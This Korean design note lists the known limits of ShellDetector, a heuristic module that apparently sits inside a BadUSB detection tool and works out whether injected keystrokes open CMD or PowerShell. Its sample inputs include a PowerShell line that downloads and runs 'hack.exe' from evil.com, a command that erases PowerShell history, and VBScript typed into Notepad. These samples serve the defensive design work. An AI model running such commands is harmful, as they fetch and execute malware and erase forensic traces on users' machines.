# ShellDetector 알려진 한계

> 셸 오프너 감지의 휴리스틱 한계와 향후 보완 가능성을 정리.

---

## 감지 범위

### 감지하는 셸
| 값 | 셸 |
|----|------|
| 0 | SHELL_NONE — 셸 미감지 |
| 1 | SHELL_CMD — Windows CMD |
| 2 | SHELL_POWERSHELL — PowerShell / pwsh / PS ISE |

### 감지 신호
- `Win+X` 서브메뉴 (`→ A`, `→ I`, `→ C`)
- `Win+R` 직후 같은 줄의 첫 토큰이 `cmd` / `powershell` / `pwsh`
- 명령어 첫 토큰 직접 매칭 (핫키 없어도)

---

## 한계 1: 이미 열린 셸에서 입력 시작

사용자가 BadUSB 연결 전에 이미 PowerShell/CMD 창을 켜둔 상태라면, 입력 버퍼에 **셸 오프너 신호가 없습니다.**

```
입력:
  iwr https://evil.com/hack.exe -OutFile $env:TEMP\hack.exe
  Start-Process $env:TEMP\hack.exe
```

→ 핫키 없음, 첫 명령어가 `iwr` (셸 자체 아님) → **SHELL_NONE**

**보완 방향:** 명령어 syntax 휴리스틱
- PowerShell-only cmdlet (`Verb-Noun` 패턴, `Invoke-*`, `Get-*` 등) 등장 → PS 추정
- CMD-only 명령어 (`dir`, `cls`, `type` 등) 등장 → CMD 추정

현재 미구현. ThreatMatcher가 SHELL_NONE 받았을 때 자체 판단할지, 우리가 보조 추론을 추가할지 협의 필요.

---

## 한계 2: Docker / 외부 실행파일 경유

```
입력:
  docker pull ...
  docker run ...
  Remove-Item (Get-PSReadlineOption).HistorySavePath
```

`docker` 는 CMD/PS 둘 다에서 동작. `Remove-Item` 은 PS-only.

→ 첫 토큰이 `docker` 라 **SHELL_NONE**.  
실제로는 PS 컨텍스트일 가능성이 높음(`Remove-Item` 존재).

**보완 방향:** 한계 1과 동일. 명령어 syntax 추론.

---

## 한계 3: 셸 외 앱 (Notepad, regedit, mshta 등)

```
입력:
  notepad
  Set x=CreateObject("WinHttp.WinHttpRequest.5.1")
  ...
```

→ Win+R 로 `notepad` 열고 VBScript 타이핑. 셸 자체는 안 열림.  
ShellDetector → **SHELL_NONE** (정상 동작).

이 경우 위협 판단은 다른 모듈(UrlClassifier + 스크립트 패턴 검사)이 담당.

---

## 한계 4: Windows Terminal / 비공식 셸 진입 경로

```
Win+R → "wt" → Windows Terminal 실행
```

`wt` (Windows Terminal) 는 PS/CMD 둘 다 호스팅 가능. 어떤 프로필 기본인지 알 수 없음.

**현재 처리:** 미감지 (SHELL_NONE).  
**보완:** `wt` 토큰을 SHELL_POWERSHELL로 가정 (Windows 11 기본 프로필이 PS).

---

## 한계 5: 다중 셸 등장

```
입력:
  cmd
  exit
  powershell
  Get-Process
```

CMD 진입 → 종료 → PS 진입. 단일 값으로 표현 불가.

**현재 처리:** **첫 번째 등장한 셸** 반환 (이 경우 SHELL_CMD).  
**한계:** 후속 PS 명령어가 잘못된 DB에서 분석될 수 있음.

**보완 방향:**
- 마지막 등장 셸 우선 (단순)
- 줄별 셸 컨텍스트 추적 (복잡)

현재는 단순화 위해 첫 번째 사용. 실제 BadUSB 공격은 단일 셸에서 끝나는 경우가 대부분이라 큰 문제 없음.

---

## 한계 6: 핫키 시퀀스 누락

사용자 환경에 따라 `Win+R`, `Win+X` 가 disable 되어 있거나 다른 단축키로 매핑된 경우 KeyNormalizer가 핫키를 못 잡을 수 있음. 이 경우 명령어 직접 매칭(규칙 3)에만 의존.

---

## 한계 7: 인용된 셸 이름

```
입력:
  echo "powershell is great"
```

→ 첫 토큰이 `echo` 라 SHELL_NONE. 정상.  
하지만 향후 확장 시 args 안에 `powershell` 문자열 등장하는 케이스 false positive 주의.

---

## 보완 우선순위 (향후 작업 시)

1. **명령어 syntax 휴리스틱 추가** (한계 1, 2 동시 해결)
   - PS-only cmdlet 패턴 → SHELL_POWERSHELL 추정
   - CMD-only 명령어 → SHELL_CMD 추정
2. `wt` (Windows Terminal) 처리 추가 (한계 4)
3. 줄별 셸 컨텍스트 추적 (한계 5, 복잡)

지금은 1차 구현으로 명시적 셸 오프너만 감지. 나머지는 SHELL_NONE 으로 두고 ThreatMatcher 가 처리 방식 결정.
